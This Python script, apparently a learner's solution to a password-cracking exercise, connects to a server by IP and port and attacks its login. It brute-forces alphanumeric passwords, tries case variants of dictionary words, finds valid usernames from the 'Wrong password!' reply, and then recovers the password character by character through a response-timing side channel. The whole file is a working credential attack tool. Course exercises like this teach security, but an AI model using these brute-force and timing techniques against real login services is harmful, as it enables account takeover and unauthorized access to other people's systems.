# write your code here
import sys
import socket
import itertools
import string
import json
import time

args = sys.argv
if len(args) != 3:
    print("The script should be called with 2 arguments (IP and port)")
else:
    ip = args[1]
    port = int(args[2])


def find_password(socket_cl, mode='log_pass'):
    if mode == 'bruteforce_pass':
        alpha_num_list = list(string.ascii_lowercase + string.digits)
        i = 1
        counter = 1
        while counter <= 1e6:
            for iteration in itertools.product(alpha_num_list, repeat=i):
                joined_iter = ''.join(iteration)
                data_to_send = joined_iter.encode()
                socket_cl.send(data_to_send)
                response_form_ser = socket_cl.recv(1024)
                response_form_ser = response_form_ser.decode()
                if response_form_ser == 'Connection success!':
                    return joined_iter
                counter += 1
            i += 1

    if mode == 'dictionary_password':
        with open('passwords.txt') as file:
            lst_pass = file.readlines()
            lst_pass = [password.rstrip() for password in lst_pass]
            for password_non_case in lst_pass:
                for password in map(lambda x: ''.join(x),
                                    itertools.product(*([letter.lower(), letter.upper()]
                                                        for letter in password_non_case))):
                    data_to_send = password.encode()
                    socket_cl.send(data_to_send)
                    response_form_ser = socket_cl.recv(1024)
                    response_form_ser = response_form_ser.decode()
                    if response_form_ser == 'Connection success!':
                        return password

    if mode == 'log_pass':
        def send_request(login, password):
            dct_send = {'login': login_non_case, 'password': password}
            json_send = json.dumps(dct_send).encode()
            socket_cl.send(json_send)
            json_recieved = socket_cl.recv(1024)
            message_1 = json.loads(json_recieved)['result']
            return message_1

        with open('logins.txt') as file:
            lst_login = file.readlines()
            lst_login = [password.rstrip() for password in lst_login]
            password = ' '
            for login_non_case in lst_login:
                message_received = send_request(login_non_case, password)
                if message_received == 'Wrong password!':
                    correct_login = login_non_case
                    break
        alpha_num_list = list(string.ascii_letters + string.digits)
        flag = True
        password = ''
        while flag:
            try:
                for symbol in alpha_num_list:
                    pass_str = password + symbol
                    start = time.time()
                    message_received = send_request(correct_login, pass_str)
                    end = time.time()
                    if (end - start) >= 0.090:
                        password = pass_str
                        break
                    elif message_received == "Connection success!":
                        flag = False
                        result = json.dumps({'login': correct_login, 'password': pass_str})
            except ConnectionResetError:
                pass
            except ConnectionAbortedError:
                pass
        return result


# creating a client socket
with socket.socket() as client_socket:
    address = (ip, port)
    client_socket.connect(address)
    print(find_password(client_socket))
